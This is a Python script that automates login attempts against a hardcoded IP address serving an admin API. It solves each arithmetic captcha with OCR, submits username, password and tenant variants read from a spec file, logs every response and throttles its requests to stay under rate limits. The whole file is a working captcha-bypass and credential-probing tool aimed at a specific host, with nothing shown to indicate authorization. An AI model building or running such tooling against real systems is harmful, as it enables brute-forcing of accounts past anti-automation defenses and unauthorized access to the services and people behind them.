#!/usr/bin/env python3
"""Low-freq login counter-dimension probes (each attempt = fresh captcha + 1 login)."""
import urllib.request, urllib.error, json, base64, re, sys, time, os
import ddddocr

BASE='http://144.123.22.234:9080/prod-api'
CLIENT_ID='7882175c171521a945ee6bdd5580377f'
beta=ddddocr.DdddOcr(beta=True,show_ad=False)
std=ddddocr.DdddOcr(show_ad=False)
LOG=open('probe.log','a',encoding='utf-8')
def log(*a):
    s=' '.join(str(x) for x in a); print(s, flush=True); LOG.write(s+'\n'); LOG.flush()

def parse(t):
    t=(t.replace('×','*').replace('✕','*').replace('x','*').replace('X','*')
         .replace('＋','+').replace('一','-').replace('—','-'))
    m=re.search(r'(\d)\s*([+\-*])\s*(\d)',t)
    if not m: return None
    a,op,c=int(m.group(1)),m.group(2),int(m.group(3))
    return {'+':a+c,'-':a-c,'*':a*c}[op], '%d%s%d'%(a,op,c)

def get_code(tries=8):
    for i in range(tries):
        try:
            t=urllib.request.urlopen(BASE+'/auth/code',timeout=20).read().decode()
        except Exception as e:
            log('CODE_ERR',repr(e)); time.sleep(10); continue
        try: d=json.loads(t)
        except Exception: log('CODE_BAD',t[:200]); time.sleep(10); continue
        if d.get('code')!=200 or not d.get('data'):
            log('CODE_RATELIMIT',t[:160]); time.sleep(12); continue
        data=d['data']; uuid=data['uuid']; img=base64.b64decode(data['img'])
        tb=beta.classification(img); ts=std.classification(img)
        p=parse(tb) or parse(ts)
        if not p:
            log('OCR_FAIL beta=%r std=%r'%(tb,ts)); time.sleep(6); continue
        return uuid, str(p[0]), p[1], tb, ts
    return None

def post(url, body):
    h={'Content-Type':'application/json;charset=utf-8','clientid':CLIENT_ID}
    raw=json.dumps(body,ensure_ascii=False).encode('utf-8')
    req=urllib.request.Request(url,data=raw,headers=h)
    try:
        r=urllib.request.urlopen(req,timeout=20); return r.status,r.read().decode(),raw
    except urllib.error.HTTPError as e:
        return e.code,e.read().decode(),raw

def run_one(item):
    rc=get_code()
    if not rc:
        log('SKIP',item['id'],'no captcha'); return None
    uuid,ans,expr,tb,ts=rc
    body={"tenantId":"000000","username":"admin","password":"Zx9!audit-nope",
          "code":ans,"uuid":uuid,"clientId":CLIENT_ID,"grantType":"password"}
    if item.get('omit_tenant'):
        body.pop('tenantId',None)
    elif 'tenantId' in item:
        body['tenantId']=item['tenantId']
    body['username']=item['username']
    body['password']=item['password']
    # keep key order readable
    order=['tenantId','username','password','code','uuid','clientId','grantType']
    body={k:body[k] for k in order if k in body}
    st,txt,raw=post(BASE+'/auth/login',body)
    rec={'id':item['id'],'desc':item.get('desc',''),'req':body,'capital':{
         'uuid':uuid,'ocr':[tb,ts],'expr':expr},'status':st,'resp':txt}
    open('att_%s.json'%item['id'],'w',encoding='utf-8').write(json.dumps(rec,ensure_ascii=False,indent=1))
    log('ATT %s | %s | tid=%r user=%s | expr=%s | -> %s %s'%(item['id'],item.get('desc',''),
        body.get('tenantId','<OMITTED>'),body['username'],expr,st,txt[:260]))
    return rec

if __name__=='__main__':
    spec=json.load(open(sys.argv[1],encoding='utf-8'))
    start=int(sys.argv[2]) if len(sys.argv)>2 else 0
    count=int(sys.argv[3]) if len(sys.argv)>3 else len(spec)
    gap=float(sys.argv[4]) if len(sys.argv)>4 else 6.0
    last=0.0
    for item in spec[start:start+count]:
        dt=time.time()-last
        if dt<gap: time.sleep(gap-dt)
        run_one(item)
        last=time.time()
